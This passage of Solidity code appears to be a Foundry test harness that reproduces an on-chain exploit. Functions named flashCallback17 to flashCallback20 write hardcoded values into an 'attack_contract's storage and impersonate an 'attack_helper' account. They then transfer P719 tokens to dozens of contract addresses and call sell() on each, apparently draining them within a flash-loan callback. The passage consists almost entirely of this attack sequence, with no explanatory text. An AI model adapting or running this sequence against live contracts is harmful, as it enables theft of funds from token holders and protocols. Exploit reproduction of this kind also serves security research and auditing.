        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(24)),
                bytes32(uint256(562038303337891283827220389514357274462830086517))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(25)),
                bytes32(uint256(918921790492038318812780025538806866307169493215))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(26)),
                bytes32(uint256(59258109052621240723085059238703240689481391365))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(27)),
                bytes32(uint256(874360546426733832907650785785267834784495547632))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(28)),
                bytes32(uint256(1102498401704275588923272485606729751841701952553))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(29)),
                bytes32(uint256(672245254139421069159259621980402824673627205077))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(30)),
                bytes32(uint256(1056860743504273485421971054704400604518719735896))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(31)),
                bytes32(uint256(875504388877580279160524987715596576165785320354))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(32)),
                bytes32(uint256(1354798459307642430956922689749292326919164630799))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(33)),
                bytes32(uint256(266861267188075185057903281316398437927187743083))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(34)),
                bytes32(uint256(736832084120903407390953078429368378997517375222))
            );
        {
            uint256 p719TransferFromAmount_44 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_44;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_C848EF_2597, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_44 = 526636214289627321527;
            IContract_C848EF_2597(Addresses.A_C848EF_2597).sell(sellLiveAmount_44);
        }
        {
            uint256 p719TransferFromAmount_45 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_45;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_689FBC_6D39, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_45 = 526636214289627321527;
            IContract_689FBC_6D39(Addresses.A_689FBC_6D39).sell(sellLiveAmount_45);
        }
        {
            uint256 p719TransferFromAmount_46 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_46;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_65B8FB_0F57, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_46 = 526636214289627321527;
            IContract_65B8FB_0F57(Addresses.A_65B8FB_0F57).sell(sellLiveAmount_46);
        }
        {
            uint256 p719TransferFromAmount_47 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_47;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_7531E1_AD55, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_47 = 526636214289627321527;
            IContract_7531E1_AD55(Addresses.A_7531E1_AD55).sell(sellLiveAmount_47);
        }
        {
            uint256 p719TransferFromAmount_48 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_48;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_886BF9_72E3, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_48 = 526636214289627321527;
            IContract_886BF9_72E3(Addresses.A_886BF9_72E3).sell(sellLiveAmount_48);
        }
        {
            uint256 p719TransferFromAmount_49 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_49;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_305415_E1BE, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_49 = 526636214289627321527;
            IContract_305415_E1BE(Addresses.A_305415_E1BE).sell(sellLiveAmount_49);
        }
        {
            uint256 p719TransferFromAmount_50 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_50;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_495943_FE82, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_50 = 526636214289627321527;
            IContract_495943_FE82(Addresses.A_495943_FE82).sell(sellLiveAmount_50);
        }
        {
            uint256 p719TransferFromAmount_51 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_51;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_C6AC1E_A6CE, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_51 = 526636214289627321527;
            IContract_C6AC1E_A6CE(Addresses.A_C6AC1E_A6CE).sell(sellLiveAmount_51);
        }
        {
            uint256 p719TransferFromAmount_52 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_52;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_219F8D_36C6, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_52 = 526636214289627321527;
            IContract_219F8D_36C6(Addresses.A_219F8D_36C6).sell(sellLiveAmount_52);
        }
        {
            uint256 p719TransferFromAmount_53 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_53;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_428A86_9111, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_53 = 526636214289627321527;
            IContract_428A86_9111(Addresses.A_428A86_9111).sell(sellLiveAmount_53);
        }
    }

    function flashCallback17() internal {
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(21)),
                bytes32(uint256(159368502770368336141594216705589913795332921016))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(22)),
                bytes32(uint256(1269037323586194141939199683205555575470563600720))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(23)),
                bytes32(uint256(1455326423976853426052847408901804701791267125024))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(24)),
                bytes32(uint256(562038303337891283827220389514357274462830086517))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(25)),
                bytes32(uint256(918921790492038318812780025538806866307169493215))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(26)),
                bytes32(uint256(59258109052621240723085059238703240689481391365))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(27)),
                bytes32(uint256(874360546426733832907650785785267834784495547632))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(28)),
                bytes32(uint256(1102498401704275588923272485606729751841701952553))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(29)),
                bytes32(uint256(672245254139421069159259621980402824673627205077))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(30)),
                bytes32(uint256(1056860743504273485421971054704400604518719735896))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(31)),
                bytes32(uint256(875504388877580279160524987715596576165785320354))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(32)),
                bytes32(uint256(1354798459307642430956922689749292326919164630799))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(33)),
                bytes32(uint256(266861267188075185057903281316398437927187743083))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(34)),
                bytes32(uint256(736832084120903407390953078429368378997517375222))
            );
        {
            uint256 p719TransferFromAmount_54 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_54;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_0F118E_B49C, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_54 = 526636214289627321527;
            IContract_0F118E_B49C(Addresses.A_0F118E_B49C).sell(sellLiveAmount_54);
        }
        {
            uint256 p719TransferFromAmount_55 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_55;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_C8FBDA_3987, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_55 = 526636214289627321527;
            IContract_C8FBDA_3987(Addresses.A_C8FBDA_3987).sell(sellLiveAmount_55);
        }
        {
            uint256 p719TransferFromAmount_56 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_56;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_B09316_0FBD, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_56 = 526636214289627321527;
            IContract_B09316_0FBD(Addresses.A_B09316_0FBD).sell(sellLiveAmount_56);
        }
        {
            uint256 p719TransferFromAmount_57 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_57;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_71955E_6A2F, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_57 = 526636214289627321527;
            IContract_71955E_6A2F(Addresses.A_71955E_6A2F).sell(sellLiveAmount_57);
        }
        {
            uint256 p719TransferFromAmount_58 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_58;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_CE9D1B_A43D, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_58 = 526636214289627321527;
            IContract_CE9D1B_A43D(Addresses.A_CE9D1B_A43D).sell(sellLiveAmount_58);
        }
        {
            uint256 p719TransferFromAmount_59 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_59;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_A4E48A_5911, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_59 = 526636214289627321527;
            IContract_A4E48A_5911(Addresses.A_A4E48A_5911).sell(sellLiveAmount_59);
        }
        {
            uint256 p719TransferFromAmount_60 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_60;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_41129F_0BCC, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_60 = 526636214289627321527;
            IContract_41129F_0BCC(Addresses.A_41129F_0BCC).sell(sellLiveAmount_60);
        }
        {
            uint256 p719TransferFromAmount_61 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_61;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_D75D6C_0582, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_61 = 526636214289627321527;
            IContract_D75D6C_0582(Addresses.A_D75D6C_0582).sell(sellLiveAmount_61);
        }
        {
            uint256 p719TransferFromAmount_62 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_62;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_F07AF9_BA20, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_62 = 526636214289627321527;
            IContract_F07AF9_BA20(Addresses.A_F07AF9_BA20).sell(sellLiveAmount_62);
        }
        {
            uint256 p719TransferFromAmount_63 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_63;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_6DA970_E923, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_63 = 526636214289627321527;
            IContract_6DA970_E923(Addresses.A_6DA970_E923).sell(sellLiveAmount_63);
        }
    }

    function flashCallback18() internal {
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(21)),
                bytes32(uint256(159368502770368336141594216705589913795332921016))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(22)),
                bytes32(uint256(1269037323586194141939199683205555575470563600720))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(23)),
                bytes32(uint256(1455326423976853426052847408901804701791267125024))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(24)),
                bytes32(uint256(562038303337891283827220389514357274462830086517))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(25)),
                bytes32(uint256(918921790492038318812780025538806866307169493215))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(26)),
                bytes32(uint256(59258109052621240723085059238703240689481391365))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(27)),
                bytes32(uint256(874360546426733832907650785785267834784495547632))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(28)),
                bytes32(uint256(1102498401704275588923272485606729751841701952553))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(29)),
                bytes32(uint256(672245254139421069159259621980402824673627205077))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(30)),
                bytes32(uint256(1056860743504273485421971054704400604518719735896))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(31)),
                bytes32(uint256(875504388877580279160524987715596576165785320354))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(32)),
                bytes32(uint256(1354798459307642430956922689749292326919164630799))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(33)),
                bytes32(uint256(266861267188075185057903281316398437927187743083))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(34)),
                bytes32(uint256(736832084120903407390953078429368378997517375222))
            );
        {
            uint256 p719TransferFromAmount_64 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_64;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_C34699_F7B5, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_64 = 526636214289627321527;
            IContract_C34699_F7B5(Addresses.A_C34699_F7B5).sell(sellLiveAmount_64);
        }
        {
            uint256 p719TransferFromAmount_65 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_65;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_812B46_A1CC, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_65 = 526636214289627321527;
            IContract_812B46_A1CC(Addresses.A_812B46_A1CC).sell(sellLiveAmount_65);
        }
        {
            uint256 p719TransferFromAmount_66 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_66;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_63F5D8_8327, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_66 = 526636214289627321527;
            IContract_63F5D8_8327(Addresses.A_63F5D8_8327).sell(sellLiveAmount_66);
        }
        {
            uint256 p719TransferFromAmount_67 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_67;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_4ADD20_19E4, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_67 = 526636214289627321527;
            IContract_4ADD20_19E4(Addresses.A_4ADD20_19E4).sell(sellLiveAmount_67);
        }
        {
            uint256 p719TransferFromAmount_68 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_68;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_E4241B_33E5, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_68 = 526636214289627321527;
            IContract_E4241B_33E5(Addresses.A_E4241B_33E5).sell(sellLiveAmount_68);
        }
        {
            uint256 p719TransferFromAmount_69 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_69;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_A01BDF_9BD2, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_69 = 526636214289627321527;
            IContract_A01BDF_9BD2(Addresses.A_A01BDF_9BD2).sell(sellLiveAmount_69);
        }
        {
            uint256 p719TransferFromAmount_70 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_70;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_0B65A4_6656, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_70 = 526636214289627321527;
            IContract_0B65A4_6656(Addresses.A_0B65A4_6656).sell(sellLiveAmount_70);
        }
        {
            uint256 p719TransferFromAmount_71 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_71;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_6EC802_1745, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_71 = 526636214289627321527;
            IContract_6EC802_1745(Addresses.A_6EC802_1745).sell(sellLiveAmount_71);
        }
        {
            uint256 p719TransferFromAmount_72 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_72;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_5AE6E9_8C28, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_72 = 526636214289627321527;
            IContract_5AE6E9_8C28(Addresses.A_5AE6E9_8C28).sell(sellLiveAmount_72);
        }
        {
            uint256 p719TransferFromAmount_73 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_73;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_45579D_0214, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_73 = 526636214289627321527;
            IContract_45579D_0214(Addresses.A_45579D_0214).sell(sellLiveAmount_73);
        }
    }

    function flashCallback19() internal {
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(21)),
                bytes32(uint256(159368502770368336141594216705589913795332921016))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(22)),
                bytes32(uint256(1269037323586194141939199683205555575470563600720))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(23)),
                bytes32(uint256(1455326423976853426052847408901804701791267125024))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(24)),
                bytes32(uint256(562038303337891283827220389514357274462830086517))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(25)),
                bytes32(uint256(918921790492038318812780025538806866307169493215))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(26)),
                bytes32(uint256(59258109052621240723085059238703240689481391365))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(27)),
                bytes32(uint256(874360546426733832907650785785267834784495547632))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(28)),
                bytes32(uint256(1102498401704275588923272485606729751841701952553))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(29)),
                bytes32(uint256(672245254139421069159259621980402824673627205077))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(30)),
                bytes32(uint256(1056860743504273485421971054704400604518719735896))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(31)),
                bytes32(uint256(875504388877580279160524987715596576165785320354))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(32)),
                bytes32(uint256(1354798459307642430956922689749292326919164630799))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(33)),
                bytes32(uint256(266861267188075185057903281316398437927187743083))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(34)),
                bytes32(uint256(736832084120903407390953078429368378997517375222))
            );
        {
            uint256 p719TransferFromAmount_74 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_74;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_79E7ED_9422, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_74 = 526636214289627321527;
            IContract_79E7ED_9422(Addresses.A_79E7ED_9422).sell(sellLiveAmount_74);
        }
        {
            uint256 p719TransferFromAmount_75 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_75;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_7FA49A_D980, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_75 = 526636214289627321527;
            IContract_7FA49A_D980(Addresses.A_7FA49A_D980).sell(sellLiveAmount_75);
        }
        {
            uint256 p719TransferFromAmount_76 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_76;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_08C191_6F73, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_76 = 526636214289627321527;
            IContract_08C191_6F73(Addresses.A_08C191_6F73).sell(sellLiveAmount_76);
        }
        {
            uint256 p719TransferFromAmount_77 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_77;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_88E75D_D569, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_77 = 526636214289627321527;
            IContract_88E75D_D569(Addresses.A_88E75D_D569).sell(sellLiveAmount_77);
        }
        {
            uint256 p719TransferFromAmount_78 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_78;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_464704_2F84, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_78 = 526636214289627321527;
            IContract_464704_2F84(Addresses.A_464704_2F84).sell(sellLiveAmount_78);
        }
        {
            uint256 p719TransferFromAmount_79 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_79;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_A922C4_4944, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_79 = 526636214289627321527;
            IContract_A922C4_4944(Addresses.A_A922C4_4944).sell(sellLiveAmount_79);
        }
        {
            uint256 p719TransferFromAmount_80 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_80;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_8B538C_FB14, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_80 = 526636214289627321527;
            IContract_8B538C_FB14(Addresses.A_8B538C_FB14).sell(sellLiveAmount_80);
        }
        {
            uint256 p719TransferFromAmount_81 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_81;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_42193B_6A2A, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_81 = 526636214289627321527;
            IContract_42193B_6A2A(Addresses.A_42193B_6A2A).sell(sellLiveAmount_81);
        }
        {
            uint256 p719TransferFromAmount_82 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_82;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_A53CE2_FEC9, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_82 = 526636214289627321527;
            IContract_A53CE2_FEC9(Addresses.A_A53CE2_FEC9).sell(sellLiveAmount_82);
        }
        {
            uint256 p719TransferFromAmount_83 = 526636214289627321527;
            {
                uint256 transferFromAmount = p719TransferFromAmount_83;
                if (transferFromAmount != 0) {
                    Harness.vmExt().startPrank(Addresses.attack_helper_422F);
                    IERC20Like(Addresses.P719).transfer(Addresses.A_22787E_4BCD, transferFromAmount);
                    Harness.vmExt().stopPrank();
                }
            }
        }
        {
            uint256 sellLiveAmount_83 = 526636214289627321527;
            IContract_22787E_4BCD(Addresses.A_22787E_4BCD).sell(sellLiveAmount_83);
        }
    }

    function flashCallback20() internal {
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(21)),
                bytes32(uint256(159368502770368336141594216705589913795332921016))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(22)),
                bytes32(uint256(1269037323586194141939199683205555575470563600720))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(23)),
                bytes32(uint256(1455326423976853426052847408901804701791267125024))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(24)),
                bytes32(uint256(562038303337891283827220389514357274462830086517))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(25)),
                bytes32(uint256(918921790492038318812780025538806866307169493215))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(26)),
                bytes32(uint256(59258109052621240723085059238703240689481391365))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(27)),
                bytes32(uint256(874360546426733832907650785785267834784495547632))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(28)),
                bytes32(uint256(1102498401704275588923272485606729751841701952553))
            );
